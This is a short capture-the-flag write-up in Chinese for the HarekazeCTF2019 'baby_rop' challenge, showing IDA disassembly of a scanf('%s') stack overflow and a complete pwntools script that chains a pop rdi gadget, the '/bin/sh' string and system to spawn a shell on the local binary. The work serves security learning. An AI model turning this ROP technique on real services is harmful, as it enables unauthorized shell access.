[HarekazeCTF2019]baby_rop

babyrop

分析

拖入IDA,查看main汇编代码 

push    rbp
mov     rbp, rsp
sub     rsp, 10h        ; 为堆栈开辟0x10的空间
mov     edi, offset command ; "echo -n \"What's your name? \""
call    _system
lea     rax, [rbp+var_10] ; 缓冲区开始写入位置
mov     rsi, rax
mov     edi, offset p__s ; "%s"
mov     eax, 0
call    ___isoc99_scanf ; 对于scanf("%s", buf)这个调用,格式化字符串'%s'存储在rdi,写入地址buf存储在rsi
lea     rax, [rbp+var_10]
mov     rsi, rax
mov     edi, offset format ; "Welcome to the Pwn World, %s!\n"
mov     eax, 0
call    _printf
mov     eax, 0
leave
retn

shift+F12查看字符串可以找到有’/bin/sh’,地址为0x601048 再找到system的调用地址(call _system)为0x4005E3 将binsh的地址pop给rdi,再调用system 先用ROPgadget找到pop rdi;ret的gadget地址为0x400683 构造payload

sys_addr = 0x4005E3
pop_rdi_ret = 0x400683
binsh_addr = 0x601048
payload = b'a' * (0x10 + 8) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)

exp 

from pwn import *
context.arch = 'amd64'
r = process('./babyrop')

sys_addr = 0x4005E3
pop_rdi_ret = 0x400683
binsh_addr = 0x601048

# payload = b'a' * (0x10 + 8) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)
payload = flat([
    b'a' * (0x10 + 8),
    pop_rdi_ret,
    binsh_addr,
    sys_addr
])

r.sendline(payload)
r.interactive()
